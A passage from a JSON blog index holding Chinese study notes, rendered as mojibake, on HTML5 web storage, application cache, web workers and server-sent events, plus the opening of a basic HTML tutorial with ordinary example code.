localStorage.setItem(\"website\", \"https://miaotony.xyz\"); // å–å› Retrieve document.getElementById(\"test_result\").innerHTML = localStorage.getItem(\"website\"); } else { document.getElementById(\"test_result\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } &lt;/script&gt; // Check browser support if (typeof(Storage) !== \"undefined\") { // å­˜å‚¨ Store localStorage.setItem(\"website\", \"https://miaotony.xyz\"); // å–å› Retrieve document.getElementById(\"test_result\").innerHTML = localStorage.getItem(\"website\"); } else { document.getElementById(\"test_result\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } é¦–å…ˆåˆ›å»º localStorage åç§°/å€¼å¯¹ï¼Œå…¶ä¸­ï¼šname=â€websiteâ€ï¼Œvalue=â€https://miaotony.xyz\" è€Œåå–å› â€œwebsiteâ€ çš„å€¼ï¼Œå¹¶æŠŠå®ƒæ’åˆ° id=â€test_resultâ€ çš„å…ƒç´ ä¸­ã€‚ ä¹Ÿå¯ä»¥æŠŠåç§°ä½œä¸ºä¸€ä¸ªå±æ€§æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š // å­˜å‚¨ localStorage.website = \"https://miaotony.xyz\"; // å–å› document.getElementById(\"test_result\").innerHTML = localStorage.website; åˆ é™¤æŸä¸€ localStorage é¡¹ç›®çš„è¯­æ³•ï¼š localStorage.removeItem(\"website\"); åç§°/å€¼å¯¹å§‹ç»ˆå­˜å‚¨ä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœéœ€è¦è¯·è®°å¾—æŠŠå®ƒä»¬è½¬æ¢ä¸ºå…¶ä»–æ ¼å¼ï¼ ä¸‹é¢è¿™ä¸ªå¯¹ç”¨æˆ·ç‚¹å‡»æŒ‰é’®çš„æ¬¡æ•°è¿›è¡Œè®¡æ•°ã€‚åœ¨ä»£ç ä¸­ï¼Œå€¼å­—ç¬¦ä¸²è¢«è½¬æ¢ä¸ºæ•°å€¼ï¼Œä¾æ¬¡å¯¹è®¡æ•°è¿›è¡Œé€’å¢ï¼š &lt;script&gt; function clickCounter1() { if(typeof(Storage) !== \"undefined\") { if (localStorage.clickcount) { localStorage.clickcount = Number(localStorage.clickcount)+1; } else { localStorage.clickcount = 1; } document.getElementById(\"result2\").innerHTML = \"æ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® \" + localStorage.clickcount + \" æ¬¡ã€‚\"; } else { document.getElementById(\"result2\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } } &lt;/script&gt; &lt;button onclick=\"clickCounter1()\" type=\"button\"&gt;è¯·ç‚¹å‡»è¿™é‡Œï¼&lt;/button&gt; &lt;div id=\"result2\"&gt;&lt;/div&gt; function clickCounter1() { if(typeof(Storage) !== \"undefined\") { if (localStorage.clickcount) { localStorage.clickcount = Number(localStorage.clickcount)+1; } else { localStorage.clickcount = 1; } document.getElementById(\"result2\").innerHTML = \"æ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® \" + localStorage.clickcount + \" æ¬¡ã€‚\"; } else { document.getElementById(\"result2\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } } è¯·ç‚¹å‡»è¿™é‡Œï¼ ç‚¹å‡»ä¹‹åè®¡æ•°å™¨å°†é€’å¢ï¼Œä¸”å…³é—­è¿™ä¸ªç½‘é¡µ/æµè§ˆå™¨å†æ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œæ•°å­—ä¼šä»ä¸Šä¸€æ¬¡çš„ä½ç½®é€’å¢ï¼Œä¸ä¼šé‡ç½®ã€‚ sessionStorage å¯¹è±¡sessionStorage å¯¹è±¡ç­‰åŒ localStorage å¯¹è±¡ï¼Œä¸åŒä¹‹å¤„åœ¨äºåªå¯¹ä¸€ä¸ª session å­˜å‚¨æ•°æ®ã€‚å¦‚æœç”¨æˆ·å…³é—­å…·ä½“çš„æµè§ˆå™¨æ ‡ç­¾é¡µï¼Œæ•°æ®ä¹Ÿä¼šè¢«åˆ é™¤ã€‚ &lt;script&gt; function clickCounter2() { if(typeof(Storage) !== \"undefined\") { if (sessionStorage.clickcount) { sessionStorage.clickcount = Number(sessionStorage.clickcount)+1; } else { sessionStorage.clickcount = 1; } document.getElementById(\"result3\").innerHTML = \"åœ¨æœ¬ session ä¸­ï¼Œæ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® \" + sessionStorage.clickcount + \" æ¬¡ã€‚\"; } else { document.getElementById(\"result3\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } } &lt;/script&gt; &lt;button onclick=\"clickCounter2()\" type=\"button\"&gt;è¯·ç‚¹å‡»è¿™é‡Œ&lt;/button&gt; &lt;div id=\"result3\"&gt;&lt;/div&gt; function clickCounter2() { if(typeof(Storage) !== \"undefined\") { if (sessionStorage.clickcount) { sessionStorage.clickcount = Number(sessionStorage.clickcount)+1; } else { sessionStorage.clickcount = 1; } document.getElementById(\"result3\").innerHTML = \"åœ¨æœ¬ session ä¸­ï¼Œæ‚¨å·²ç»ç‚¹å‡»è¿™ä¸ªæŒ‰é’® \" + sessionStorage.clickcount + \" æ¬¡ã€‚\"; } else { document.getElementById(\"result3\").innerHTML = \"æŠ±æ­‰ï¼æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ Web Storage ...\"; } } è¯·ç‚¹å‡»è¿™é‡Œ ç‚¹å‡»ä¹‹åè®¡æ•°å™¨ä¹Ÿå°†é€’å¢ï¼Œä½†æ˜¯å…³é—­è¿™ä¸ªç½‘é¡µ/æµè§ˆå™¨å†æ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œæ•°å­—ä¸ä¼šä»ä¸Šä¸€æ¬¡çš„ä½ç½®é€’å¢ï¼Œç›´æ¥é‡ç½®ã€‚ å½“ç„¶ï¼Œåˆ·æ–°çš„è¯è¿˜æ˜¯åŒä¸€ä¸ª sessionï¼Œæ‰€ä»¥è¿˜æ˜¯ä¿ç•™çš„ã€‚ æŒ‰ä¸‹ F12ï¼Œåœ¨å­˜å‚¨é‡Œä¹Ÿå¯ä»¥çœ‹å¾—åˆ°ä¼šè¯å­˜å‚¨å’Œæœ¬åœ°å­˜å‚¨ã€‚ åº”ç”¨ç¨‹åºç¼“å­˜ä½¿ç”¨åº”ç”¨ç¨‹åºç¼“å­˜ï¼ˆApplication Cacheï¼‰ï¼Œé€šè¿‡åˆ›å»º cache manifest æ–‡ä»¶ï¼Œå¯è½»æ¾åˆ›å»º web åº”ç”¨çš„ç¦»çº¿ç‰ˆæœ¬ã€‚ Cache Manifest åŸºç¡€å¦‚éœ€å¯ç”¨åº”ç”¨ç¨‹åºç¼“å­˜ï¼Œéœ€è¦åœ¨æ–‡æ¡£çš„ &lt;html&gt; æ ‡ç­¾ä¸­åŒ…å« manifest å±æ€§ã€‚ &lt;!DOCTYPE HTML&gt; &lt;html manifest=\"demo.appcache\"&gt; ... &lt;/html&gt; æ¯ä¸ªæŒ‡å®šäº† manifest çš„é¡µé¢åœ¨ç”¨æˆ·å¯¹å…¶è®¿é—®æ—¶éƒ½ä¼šè¢«ç¼“å­˜ã€‚å¦‚æœæœªæŒ‡å®š manifest å±æ€§ï¼Œåˆ™é¡µé¢ä¸ä¼šè¢«ç¼“å­˜ï¼ˆé™¤éåœ¨ manifest æ–‡ä»¶ä¸­ç›´æ¥æŒ‡å®šäº†è¯¥é¡µé¢ï¼‰ã€‚ manifest æ–‡ä»¶çš„å»ºè®®æ–‡ä»¶æ‰©å±•åæ˜¯ï¼šâ€.appcacheâ€ã€‚ manifest æ–‡ä»¶éœ€è¦è®¾ç½®æ­£ç¡®çš„ MIME-typeï¼Œå³ â€œtext/cache-manifestâ€ã€‚å¿…é¡»åœ¨ web æœåŠ¡å™¨ä¸Šè¿›è¡Œé…ç½®ã€‚ Manifest æ–‡ä»¶manifest æ–‡ä»¶æ˜¯ç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨æ¥å‘ŠçŸ¥æµè§ˆå™¨è¢«ç¼“å­˜çš„å†…å®¹ï¼ˆä»¥åŠä¸ç¼“å­˜çš„å†…å®¹ï¼‰ã€‚ åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š CACHE MANIFEST - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶å°†åœ¨é¦–æ¬¡ä¸‹è½½åè¿›è¡Œç¼“å­˜ NETWORK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶éœ€è¦ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œä¸”ä¸ä¼šè¢«ç¼“å­˜ FALLBACK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶è§„å®šå½“é¡µé¢æ— æ³•è®¿é—®æ—¶çš„å›é€€é¡µé¢ï¼ˆæ¯”å¦‚ 404 é¡µé¢ï¼‰ å®Œæ•´èŒƒä¾‹ï¼š CACHE MANIFEST # 2020-02-20 v1.0.0 /theme.css /logo.gif /main.js NETWORK: * FALLBACK: /html/ /offline.html ç¬¬ä¸€è¡Œï¼ŒCACHE MANIFESTï¼Œæ˜¯å¿…éœ€çš„ã€‚ NETWORK ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ˜Ÿå·æ¥æŒ‡ç¤ºæ‰€æœ‰å…¶ä»–å…¶ä»–èµ„æº/æ–‡ä»¶éƒ½éœ€è¦è”ç½‘ã€‚ FALLBACK ä¸­ï¼Œè§„å®šå¦‚æœæ— æ³•å»ºç«‹å› ç‰¹ç½‘è¿æ¥ï¼Œåˆ™ç”¨ â€œoffline.htmlâ€ æ›¿ä»£ /html/ ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚ ä¸€æ—¦åº”ç”¨è¢«ç¼“å­˜ï¼Œå®ƒå°±ä¼šä¿æŒç¼“å­˜ï¼Œæ›´æ–°ç¼“å­˜æœ‰ä»¥ä¸‹è¿™å‡ ç§æƒ…å†µã€‚ ç”¨æˆ·æ¸…ç©ºæµè§ˆå™¨ç¼“å­˜ manifest æ–‡ä»¶è¢«ä¿®æ”¹ ç”±ç¨‹åºæ¥æ›´æ–°åº”ç”¨ç¼“å­˜ ä»¥ â€œ#â€ å¼€å¤´çš„æ˜¯æ³¨é‡Šè¡Œï¼Œä½†ä¹Ÿå¯æ»¡è¶³å…¶ä»–ç”¨é€”ã€‚åº”ç”¨çš„ç¼“å­˜åªä¼šåœ¨å…¶ manifest æ–‡ä»¶æ”¹å˜æ—¶è¢«æ›´æ–°ã€‚ æ›´æ–°æ³¨é‡Šè¡Œä¸­çš„æ—¥æœŸå’Œç‰ˆæœ¬å·å°±å¯ä»¥è®©æµè§ˆå™¨é‡æ–°ç¼“å­˜æ–‡ä»¶ã€‚ Web WorkersWeb worker æ˜¯è¿è¡Œåœ¨åå°çš„ JavaScriptï¼Œä¸ä¼šå½±å“é¡µé¢çš„æ€§èƒ½ã€‚ å½“åœ¨ HTML é¡µé¢ä¸­æ‰§è¡Œè„šæœ¬æ—¶ï¼Œåœ¨è„šæœ¬æ‰§è¡Œç»“æŸä¹‹å‰é¡µé¢æ˜¯ä¸å¯å“åº”çš„ã€‚ä½¿ç”¨ Web worker å°±å¯ä»¥ç‹¬ç«‹äºå…¶ä»–è„šæœ¬æ¥åœ¨åå°æ‰§è¡Œï¼Œå‰å°ç…§æ ·å¯ä»¥è¿›è¡Œç‚¹å‡»ã€é€‰å–å†…å®¹ç­‰ç­‰æ“ä½œã€‚ é€šå¸¸ç”¨äºè€—è´¹ CPU èµ„æºçš„ä»»åŠ¡ã€‚ ç”±äº web worker ä½äºå¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œå®ƒä»¬æ— æ³•è®¿é—®ä¸‹ä¾‹ JavaScript å¯¹è±¡ï¼š window å¯¹è±¡ document å¯¹è±¡ parent å¯¹è±¡ é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ª web worker æ–‡ä»¶ï¼Œæ¯”å¦‚è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªè®¡æ•°çš„è„šæœ¬ã€‚ var i = 0; function timedCount() { i = i + 1; postMessage(i); setTimeout(\"timedCount()\",500); } timedCount(); å…¶ä¸­çš„ postMessage() æ–¹æ³•ç”¨äºå‘ HTML é¡µé¢ä¼ å›ä¸€æ®µæ¶ˆæ¯ã€‚ è€Œååœ¨ HTML ä¸­åˆ›å»ºä¸€ä¸ª Web Worker å¯¹è±¡ï¼Œè¿è¡Œä¸Šé¢æ–‡ä»¶ä¸­çš„ä»£ç ã€‚ w = new Worker(\"demo_workers.js\"); ç„¶åè®© Web Worker ç›‘å¬ onmessage äº‹ä»¶ã€‚ å½“ web worker ä¼ é€æ¶ˆæ¯æ—¶ï¼Œä¼šæ‰§è¡Œäº‹ä»¶ç›‘å¬å™¨ä¸­çš„ä»£ç ã€‚æ¥è‡ª web worker çš„æ•°æ®ä¼šå­˜å‚¨äº event.data ä¸­ã€‚ w.onmessage = function(event){ document.getElementById(\"result\").innerHTML = event.data; }; åˆ›å»º web worker åï¼Œå®ƒä¼šç»§ç»­ç›‘å¬æ¶ˆæ¯ï¼ˆå³ä½¿åœ¨å¤–éƒ¨è„šæœ¬å®Œæˆåï¼‰ç›´åˆ°å…¶è¢«ç»ˆæ­¢ä¸ºæ­¢ã€‚ éœ€è¦ç»ˆæ­¢è¿™ä¸ª web workerï¼Œå¹¶é‡Šæ”¾æµè§ˆå™¨/è®¡ç®—æœºèµ„æºï¼Œå¯ä»¥ä½¿ç”¨ terminate() æ–¹æ³•ã€‚ ç»ˆæ­¢åå†å°†åŸæ¥çš„å˜é‡ï¼ˆwï¼‰è®¾ç½®ä¸º undefinedï¼Œåˆ™åˆå¯ä»¥å¤ç”¨ä»£ç å•¦ï¼ HTMLä¸­çš„å®Œæ•´ä»£ç å¦‚ä¸‹ã€‚ &lt;p&gt;Count numbers: &lt;output id=\"result\"&gt;&lt;/output&gt;&lt;/p&gt; &lt;button onclick=\"startWorker()\"&gt;Start Worker&lt;/button&gt; &lt;button onclick=\"stopWorker()\"&gt;Stop Worker&lt;/button&gt; &lt;br&gt;&lt;br&gt; &lt;script&gt; var w; function startWorker() { if(typeof(Worker) !== \"undefined\") { if(typeof(w) == \"undefined\") { w = new Worker(\"demo_workers.js\"); } w.onmessage = function(event) { document.getElementById(\"result\").innerHTML = event.data; }; } else { document.getElementById(\"result\").innerHTML = \"Sorry! No Web Worker support.\"; } } function stopWorker() { w.terminate(); w = undefined; } &lt;/script&gt; Server-Sent äº‹ä»¶Server-Sent äº‹ä»¶ï¼ˆSSEï¼‰æŒ‡çš„æ˜¯ç½‘é¡µè‡ªåŠ¨ä»æœåŠ¡å™¨è·å¾—æ›´æ–°ã€‚ EventSource å¯¹è±¡ç”¨äºæ¥æ”¶æœåŠ¡å™¨å‘é€äº‹ä»¶é€šçŸ¥ã€‚ å®ƒæœ‰è¿™å‡ ç§æ–¹æ³•ï¼š äº‹ä»¶ æè¿° onopen å½“é€šå¾€æœåŠ¡å™¨çš„è¿æ¥è¢«æ‰“å¼€ onmessage å½“æ¥æ”¶åˆ°æ¶ˆæ¯ onerror å½“å‘ç”Ÿé”™è¯¯ æœ€å¸¸ç”¨çš„å°± onmessage æ–¹æ³•ã€‚ var source = new EventSource(\"demo_sse.php\"); source.onmessage = function(event) { document.getElementById(\"result\").innerHTML += event.data + \"&lt;br&gt;\"; }; è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ª EventSource å¯¹è±¡ï¼Œç„¶åè§„å®šå‘é€æ›´æ–°çš„é¡µé¢çš„ URLï¼ˆâ€demo_sse.phpâ€ï¼‰ã€‚ æ¯å½“æ¥æ”¶åˆ°ä¸€æ¬¡æ›´æ–°ï¼Œå°±ä¼šå‘ç”Ÿ onmessage äº‹ä»¶ï¼ŒæŠŠå·²æ¥æ”¶çš„æ•°æ®æ¨å…¥ id ä¸º â€œresultâ€ çš„å…ƒç´ ä¸­ã€‚ æœ€å¥½å†åŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œçœ‹çœ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒSSEã€‚ &lt;div id=\"result\"&gt;&lt;/div&gt; &lt;script&gt; if(typeof(EventSource)!==\"undefined\") { var source=new EventSource(\"/example/html5/demo_sse.php\"); source.onmessage=function(event) { document.getElementById(\"result\").innerHTML+=event.data + \"&lt;br /&gt;\"; }; } else { document.getElementById(\"result\").innerHTML=\"æŠ±æ­‰ï¼Œæ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ server-sent äº‹ä»¶ ...\"; } &lt;/script&gt; æœåŠ¡å™¨ç«¯çš„è¯ï¼ŒæŠŠ \"Content-Type\" æŠ¥å¤´è®¾ç½®ä¸º \"text/event-stream\"ï¼Œå°±å¯ä»¥å¼€å§‹å‘é€äº‹ä»¶æµäº†ã€‚ å°ç»“HTML çš„éƒ¨åˆ†å¤§æ¦‚å°±å‘Šä¸€æ®µè½äº†ï¼Œå¦‚æœè¦å…·ä½“å­¦çš„è¯ï¼Œè¦æƒ³ææ¸…æ¥šæ¯ä¸ªå±æ€§çš„å«ä¹‰å°±æ„Ÿè§‰åœ¨çœ‹æ–‡æ¡£äº†ï¼Œæ„Ÿè§‰æ²¡æœ‰å¿…è¦ã€‚ è¿˜ä¸å¦‚ä¹‹åæœ‰ä¸ç†è§£çš„å†å›æ¥ç¿»ä¸€ç¿»ï¼Œæ›´ç‹­ä¹‰çš„çŸ¥è¯†ç‚¹ç›´æ¥æŸ¥æ–‡æ¡£å°±å¥½äº†å‘€ï¼ æ¥ä¸‹æ¥å°±æ…¢æ…¢çœ‹çœ‹ CSS å’Œ JavaScriptå¥½äº†ã€‚ æºœäº†æºœäº†ã€‚ ï¼ˆè¿™ä¸ªå¯’å‡å‡ºä¸äº†é—¨å¥½éš¾å—å•Šå˜¤å˜¤å˜¤&nbsp;","path":"2020/02/18/FrontEnd_HTML_Advanced/"},{"title":"FrontEnd | HTML åŸºç¡€å…¥é—¨å­¦ä¹ ç¬”è®°","text":"å‰è¨€æœ€è¿‘æƒ³ç³»ç»Ÿä¸€ç‚¹å­¦ä¸€å­¦å‰ç«¯ï¼Œè¿™ä¸€ç¯‡åšå®¢å°±ç®€è¦è®°å½•ä¸€äº›å‰ç«¯ä¸­ HTML åŸºç¡€å…¥é—¨çš„å­¦ä¹ ç¬”è®°å§ã€‚ çœ‹å®Œäº†å°ç”²é±¼ç›®å‰æ›´æ–°äº†çš„webå¼€å‘å…¥é—¨çš„è§†é¢‘ï¼Œè®²çš„è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œæ€»ä½“æ¥è¯´è¿˜ç®—æ¯”è¾ƒç³»ç»Ÿçš„ï¼Œè€Œä¸”ç–‘è½¦æœ‰æ®23333ã€‚ ä¸è¿‡æ„Ÿè§‰ä¸å¤Ÿå…¨é¢ï¼Œäºæ˜¯å†æ¥åˆ·äº†ä¸€é W3Schoolã€‚ åé¢å¿˜äº†è¿˜å¯ä»¥å†æ¥çœ‹çœ‹ï¼Œæˆ–è€…å†æŸ¥æ–‡æ¡£å°±å®Œäº‹äº†ã€‚ğŸ˜‚ å…¶å®å°±æ˜¯ç®€å•è¿‡ä¸€é23333 ç±»ä¼¼äºæŠ„ä¸€éï¼ˆx è¿™ç¯‡æ–‡ç« è¶…é•¿é•¿é•¿é•¿é•¿é•¿é•¿é•¿â€¦â€¦ æ‰€ä»¥å…ˆåšå¥½å‡†å¤‡ã€‚ ç”±äºæˆ‘çš„åšå®¢è‡ªå¸¦äº†ä¸€äº›CSSæ ·å¼ï¼Œæ˜¾ç¤ºçš„æ•ˆæœå¯èƒ½å’Œé¢„è®¡çš„ä¸åŒï¼Œæœ€å¥½è¿˜æ˜¯å»ºä¸€ä¸ªæ–°çš„HTMLæ–‡ä»¶æ¥è¯•è¯•å§ã€‚ ä¸€äº›å‚è€ƒçš„ç½‘ç«™W3School HTML æ•™ç¨‹ é€ŸæŸ¥å®å…¸ï¼šHTML5 APIé€ŸæŸ¥ï¼ˆé±¼Cå·¥ä½œå®¤ï¼‰ HTML èœé¸Ÿæ•™ç¨‹ Bç«™è§†é¢‘ ï¼ˆå°ç”²é±¼çš„è§†é¢‘å±…ç„¶è¿˜æ²¡æ›´æ–°å®Œï¼Œå‚¬æ›´ä¸€æ³¢ æ•´ä½“æ¡†æ¶HTML5 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; åœ¨VS Codeä¸­å¯ä»¥ç›´æ¥è¾“å…¥html:5ï¼ŒæŒ‰ä¸‹Tabé”®å³å¯è‡ªåŠ¨è¾“å…¥æ¨¡æ¿ã€‚ç”¨çš„æ˜¯ Emmet Abbreviationã€‚ ä¸‹é¢ä¸»è¦å‚è€ƒ W3School çš„æ•™ç¨‹ã€‚æ›´è¯¦ç»†çš„è¯·å‚è€ƒå®˜ç½‘ã€‚ å…ƒç´ HTML æ–‡æ¡£æ˜¯ç”± HTML å…ƒç´ å®šä¹‰çš„ã€‚ å…ƒç´ æŒ‡çš„æ˜¯ä»å¼€å§‹æ ‡ç­¾ï¼ˆstart tagï¼‰ orå¼€æ”¾æ ‡ç­¾ï¼ˆopening tagï¼‰ åˆ°ç»“æŸæ ‡ç­¾ï¼ˆend tagï¼‰ oré—­åˆæ ‡ç­¾ï¼ˆclosing tagï¼‰ çš„æ‰€æœ‰ä»£ç ã€‚ ç©ºå…ƒç´ åœ¨å¼€å§‹æ ‡ç­¾ä¸­è¿›è¡Œå…³é—­ï¼ˆä»¥å¼€å§‹æ ‡ç­¾çš„ç»“æŸè€Œç»“æŸï¼‰ï¼Œå¦‚&lt;br /&gt;ã€‚è™½ç„¶å†™æˆ&lt;br&gt;ä¹Ÿè¡Œï¼Œä½†å»ºè®®éƒ½å…³é—­ã€‚ HTML æ ‡ç­¾å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼š&lt;P&gt; ç­‰åŒäº&lt;p&gt;ã€‚ä½†æ˜¯æ¨è/å¼ºåˆ¶ä½¿ç”¨å°å†™å­—æ¯ã€‚ å±æ€§å±æ€§ä¸º HTML å…ƒç´ æä¾›é™„åŠ ä¿¡æ¯ã€‚ å±æ€§æ€»æ˜¯ä»¥åç§°/å€¼å¯¹çš„å½¢å¼å‡ºç°ï¼Œæ¯”å¦‚ï¼š*name=â€valueâ€*ã€‚æ€»æ˜¯åœ¨ HTML å…ƒç´ çš„å¼€å§‹æ ‡ç­¾ä¸­è§„å®šã€‚ å±æ€§å’Œå±æ€§å€¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿã€‚ä½†æ¨èä½¿ç”¨å°å†™ã€‚ å±æ€§å€¼è¦åŒ…å«åœ¨å¼•å·å†…ï¼ŒåŒå¼•å·ã€å•å¼•å·å‡å¯ã€‚è‹¥å±æ€§å€¼æœ¬èº«å°±å«æœ‰åŒå¼•å·ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨å•å¼•å·â†“ã€‚ name='Bill \"HelloWorld\" Gates' å¸¸ç”¨çš„ HTML å±æ€§ï¼š å±æ€§ å€¼ æè¿° class classname è§„å®šå…ƒç´ çš„ç±»åï¼ˆclassnameï¼‰ id id è§„å®šå…ƒç´ çš„å”¯ä¸€ id style style_definition è§„å®šå…ƒç´ çš„è¡Œå†…æ ·å¼ï¼ˆinline styleï¼‰ title text è§„å®šå…ƒç´ çš„é¢å¤–ä¿¡æ¯ï¼ˆå¯åœ¨å·¥å…·æç¤ºä¸­æ˜¾ç¤ºï¼‰ å¤´éƒ¨ headheadå…ƒç´ ä¸­å¯ä»¥åŒ…å«&lt;title&gt;ã€&lt;base&gt;ã€&lt;link&gt;ã€&lt;meta&gt;ã€&lt;script&gt; ä»¥åŠ &lt;style&gt;ã€‚ title å…ƒç´ &lt;title&gt; æ ‡ç­¾å®šä¹‰æ–‡æ¡£çš„æ ‡é¢˜ã€‚ &lt;head&gt; &lt;title&gt;Title of the document&lt;/title&gt; &lt;/head&gt; base å…ƒç´ &lt;base&gt; æ ‡ç­¾ä¸ºé¡µé¢ä¸Šçš„æ‰€æœ‰é“¾æ¥è§„å®šé»˜è®¤åœ°å€æˆ–é»˜è®¤ç›®æ ‡ï¼ˆtargetï¼‰ï¼š &lt;head&gt; &lt;base href=\"https://miaotony.xyz/\" /&gt; &lt;base target=\"_blank\" /&gt; &lt;/head&gt; link å…ƒç´ å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»ã€‚å¦‚æ ·å¼è¡¨ç­‰ã€‚ &lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt; &lt;/head&gt; style å…ƒç´ &lt;style&gt; æ ‡ç­¾ç”¨äºä¸º HTML æ–‡æ¡£å®šä¹‰æ ·å¼ä¿¡æ¯ã€‚ &lt;head&gt; &lt;style type=\"text/css\"&gt; body {background-color:yellow} p {color:blue} &lt;/style&gt; &lt;/head&gt; meta å…ƒç´ å…ƒæ•°æ®ï¼ˆmetadataï¼‰æ˜¯å…³äºæ•°æ®çš„ä¿¡æ¯ã€‚ &lt;meta&gt; æ ‡ç­¾æä¾›å…³äº HTML æ–‡æ¡£çš„å…ƒæ•°æ®ã€‚å…ƒæ•°æ®ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†æ˜¯å¯¹äºæœºå™¨æ˜¯å¯è¯»çš„ã€‚ å…¸å‹çš„æƒ…å†µæ˜¯ï¼Œmeta å…ƒç´ è¢«ç”¨äºè§„å®šé¡µé¢çš„æè¿°ã€å…³é”®è¯ã€æ–‡æ¡£çš„ä½œè€…ã€æœ€åä¿®æ”¹æ—¶é—´ä»¥åŠå…¶ä»–å…ƒæ•°æ®ã€‚ &lt;meta&gt; æ ‡ç­¾å§‹ç»ˆä½äº head å…ƒç´ ä¸­ã€‚ å…ƒæ•°æ®å¯ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»– web æœåŠ¡ã€‚ æŒ‡å®š UTF-8 ç¼–ç &lt;meta charset=\"utf-8\"&gt; ç½‘é¡µå°ºå¯¸è‡ªé€‚åº”&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; ä¸€äº›SEOå…³é”®è¯ä¼˜åŒ–å…³é”®è¯ï¼Œæè¿°ï¼Œä½œè€…ç­‰ã€‚ &lt;meta name=\"keywords\" content=\"MiaoTony, HTML, test\" /&gt; &lt;meta name=\"description\" content=\"MiaoTony's HTML test.\"/&gt; &lt;meta name=\"author\" content=\"MiaoTony\" /&gt; è‡ªåŠ¨åˆ·æ–°è·³è½¬é¡µé¢ / é‡å®šå‘é¡µé¢&lt;meta http-equiv=\"refresh\" content=\"0; https://miaotony.xyz\" /&gt; 0såè‡ªåŠ¨è·³è½¬ã€‚ æ ‡é¢˜æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡ &lt;h1&gt; - &lt;h6&gt;å®šä¹‰ï¼Œä»å¤§åˆ°å°ã€‚ &lt;h1&gt;This is heading 1&lt;/h1&gt; &lt;h2&gt;This is heading 2&lt;/h2&gt; &lt;h3&gt;This is heading 3&lt;/h3&gt; &lt;h4&gt;This is heading 4&lt;/h4&gt; &lt;h5&gt;This is heading 5&lt;/h5&gt; &lt;h6&gt;This is heading 6&lt;/h6&gt; è¯·ä»…ä»…æŠŠæ ‡é¢˜æ ‡ç­¾ç”¨äºæ ‡é¢˜æ–‡æœ¬ã€‚ä¸è¦ä»…ä»…ä¸ºäº†äº§ç”Ÿç²—ä½“æ–‡æœ¬è€Œä½¿ç”¨å®ƒä»¬ã€‚è¯·ä½¿ç”¨å…¶å®ƒæ ‡ç­¾æˆ– CSS ä»£æ›¿ã€‚ æ°´å¹³çº¿&lt;hr /&gt;æ ‡ç­¾ç”¨äºå®šä¹‰æ°´å¹³çº¿ã€‚å¦‚â†“ã€‚ æ®µè½ &lt;p&gt; æ ‡ç­¾ æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ï¼ˆ&lt;p&gt; æ˜¯å—çº§å…ƒç´ ï¼‰ æ’å…¥ç©ºè¡Œå¯ä»¥åˆ©ç”¨ &lt;br /&gt;ï¼Œä¸è¦ç”¨ p æ ‡ç­¾ã€‚ &lt;p&gt;è¿™æ˜¯æ®µè½&lt;/p&gt; è¿™æ˜¯æ®µè½ åœ¨ä¸äº§ç”Ÿä¸€ä¸ªæ–°æ®µè½çš„æƒ…å†µä¸‹è¿›è¡Œæ¢è¡Œï¼ˆæ–°è¡Œï¼‰ï¼Œä½¿ç”¨ &lt;br /&gt;ï¼Œæ¯”å¦‚ï¼š &lt;p&gt;This is&lt;br /&gt;a para&lt;br /&gt;graph with line breaks&lt;/p&gt; This isa 